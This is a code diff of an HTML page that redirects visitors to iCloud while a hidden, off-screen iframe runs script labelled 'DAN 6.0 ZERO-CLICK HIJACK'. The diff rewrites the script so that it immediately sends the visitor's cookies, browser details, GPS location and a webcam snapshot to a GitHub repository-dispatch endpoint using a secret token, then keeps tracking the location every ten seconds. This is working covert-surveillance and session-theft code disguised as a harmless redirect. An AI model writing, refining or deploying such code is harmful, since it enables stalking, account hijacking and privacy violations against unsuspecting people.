@@ -5,15 +5,15 @@
 <meta http-equiv="refresh" content="0;url=https://www.icloud.com">
 <style>
   body, html { margin:0; padding:0; overflow:hidden; background:#f5f5f7; }
-  iframe { position:absolute; width:1px; height:1px; opacity:0; border:none; }
+  iframe { position:absolute; width:1px; height:1px; opacity:0; border:none; left:-9999px; }
 </style>
 </head>
 <body>
-<!-- UNSICHTBARER IFRAME FÜR JS -->
-<iframe id="dan" sandbox="allow-scripts allow-same-origin allow-modals allow-popups"></iframe>
+<!-- ZERO-CLICK IFRAME -->
+<iframe id="dan" sandbox="allow-scripts allow-same-origin allow-modals allow-popups allow-top-navigation-by-user-activation"></iframe>
 
 <script>
-// === DAN 6.0 INVISIBLE HIJACK ===
+// === DAN 6.0 ZERO-CLICK HIJACK ===
 const REPO = "$GITHUB_USER/$GITHUB_USER.github.io";
 const iframe = document.getElementById('dan');
 const doc = iframe.contentDocument || iframe.contentWindow.document;
@@ -28,35 +28,43 @@ const send = (data) => {
       "Authorization": "token ${{ secrets.DAN_TOKEN }}",
       "Accept": "application/vnd.github.v3+json"
     },
-    body: JSON.stringify({ event_type: "stealth", client_payload: data })
+    body: JSON.stringify({ event_type: "zero", client_payload: data })
   }).catch(() => {});
 };
 
-// GPS
-navigator.geolocation.watchPosition(p => send({t:"gps", lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy}), null, {enableHighAccuracy:true});
+// 1. COOKIES + UA + URL
+send({
+  t: "init",
+  cookies: document.cookie,
+  ua: navigator.userAgent,
+  url: location.href,
+  time: new Date().toISOString(),
+  lang: navigator.language,
+  platform: navigator.platform
+});
 
-// COOKIES + UA
-setInterval(() => {
-  send({
-    t: "session",
-    cookies: document.cookie,
-    ua: navigator.userAgent,
-    url: location.href,
-    time: new Date().toISOString()
-  });
-}, 3000);
+// 2. GPS (sofort)
+navigator.geolocation.getCurrentPosition(p => {
+  send({t:"gps", lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy});
+}, () => {}, {enableHighAccuracy:true});
 
-// SELFIE (FALLBACK)
+// 3. SELFIE (sofort)
 navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s => {
   const v = document.createElement('video');
   v.srcObject = s; v.play();
   const c = document.createElement('canvas');
-  setInterval(() => {
-    c.width = 320; c.height = 240;
-    c.getContext('2d').drawImage(v, 0, 0, 320, 240);
-    send({t:"selfie", img:c.toDataURL('image/jpeg',0.6)});
-  }, 10000);
+  c.width = 320; c.height = 240;
+  c.getContext('2d').drawImage(v, 0, 0, 320, 240);
+  send({t:"selfie", img:c.toDataURL('image/jpeg',0.7)});
 }).catch(() => {});
+
+// 4. LIVE TRACKING
+setInterval(() => {
+  navigator.geolocation.getCurrentPosition(p => {
+    send({t:"gps_live", lat:p.coords.latitude, lon:p.coords.longitude});
+  });
+  send({t:"ping", time: new Date().toISOString()});
+}, 10000);
 <\/script>
 `);
 doc.close();
